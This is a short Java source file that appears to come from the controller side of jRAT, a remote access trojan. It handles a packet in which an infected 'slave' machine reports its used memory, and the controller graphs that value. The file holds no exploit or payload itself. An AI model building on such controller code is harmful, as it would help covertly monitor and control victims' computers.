package jrat.controller.packets.incoming;

import jrat.common.utils.MathUtils;
import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelMemoryUsage;


public class Packet24UsedMemory extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		long used = slave.readLong();
		
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		
		if (frame != null) {
			PanelMemoryUsage panel = (PanelMemoryUsage) frame.panels.get("memory usage");

			if (panel != null) {
				panel.getGraph().addValues(used, slave.getMemory());

				if (frame.getTabbedPane().getTitleAt(1).equals("memory usage") && frame.getTabbedPane().getSelectedIndex() == 1) {
					panel.getGraph().repaint();
				}
				panel.getProgressBar().setValue(MathUtils.getPercentFromTotal(used, slave.getMemory()));
			}
		}

	}

}
